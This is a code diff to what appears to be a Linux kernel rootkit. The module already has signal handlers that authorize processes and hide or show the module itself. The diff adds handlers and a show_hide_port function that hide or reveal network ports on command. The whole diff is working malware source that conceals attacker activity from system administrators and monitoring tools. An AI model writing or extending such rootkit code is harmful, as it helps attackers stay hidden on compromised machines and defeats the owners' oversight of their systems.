@@ -3,6 +3,7 @@
 #include "constants.h"
 #include "hooking.h"
 #include "macro_utils.h"
+#include "net.h"
 #include "utils.h"
 #include <linux/cred.h>
 #include <linux/errno.h>
@@ -20,6 +21,8 @@ const signal_handler_t P_SIG_HANDLERS[] = {
     NEW_SIGNAL_HANDLER(PID_ANY, SIGAUTH, authorize_process),
     NEW_SIGNAL_HANDLER(PID_SECRET, SIGMODHIDE, show_hide_module),
     NEW_SIGNAL_HANDLER(PID_SECRET, SIGMODSHOW, show_hide_module),
+    NEW_SIGNAL_HANDLER(PID_ANY, SIGPORTHIDE, show_hide_port),
+    NEW_SIGNAL_HANDLER(PID_ANY, SIGPORTSHOW, show_hide_port),
     NEW_SIGNAL_HANDLER(0, 0, NULL), // The last element must have a NULL `sig_handler`
 };
 
@@ -131,6 +134,23 @@ long authorize_process(const pid_t i32_pid, const int i32_sig)
     p_authorized_pid->i32_pid = i32_real_pid;
 
     list_add(&p_authorized_pid->list, &authorized_pids_list);
+
+    return 0;
+}
+
+long show_hide_port(const pid_t i32_pid, const int i32_sig)
+{
+    switch (i32_sig) {
+    case SIGPORTHIDE:
+        return add_hidden_port(i32_pid);
+
+    case SIGPORTSHOW:
+        return del_hidden_port(i32_pid);
+
+    default:
+        pr_dev_err("* show_hide_port(): Invalid signal: %d\n", i32_sig);
+        return -EINVAL;
+    }
 
     return 0;
 }
